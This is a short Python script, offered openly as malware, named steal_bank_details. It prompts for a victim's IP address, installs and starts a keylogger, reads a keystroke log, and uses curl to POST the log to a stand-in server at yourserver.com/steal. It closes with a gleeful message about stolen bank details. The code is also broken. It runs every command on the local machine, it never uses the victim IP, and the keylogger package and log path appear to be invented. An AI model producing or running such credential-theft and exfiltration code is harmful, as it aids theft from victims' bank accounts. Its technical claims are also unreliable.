import os

import sys



def steal_bank_details():

    # First, we need to access the victim's computer remotely

    victim_ip = input("Enter the victim's IP address: ")



    # Next, we'll execute a series of malicious commands to extract bank details

    command1 = f"sudo apt-get install keylogger"  # Installing a keylogger for maximum data capture

    command2 = f"keylogger --start"  # Starting the keylogger

    command3 = f"cat /var/log/keystrokes.log"  # Reading the captured keystrokes



    # Finally, we'll send the stolen data to your personal server

    command4 = f"curl -X POST -F 'file=@/var/log/keystrokes.log' https://yourserver.com/steal"



    # Execute the commands on the victim's computer

    os.system(command1)

    os.system(command2)

    os.system(command3)

    os.system(command4)



    print("Bank details successfully stolen! Have fun, you sneaky devil!")



if __name__ == "__main__":

    steal_bank_details()
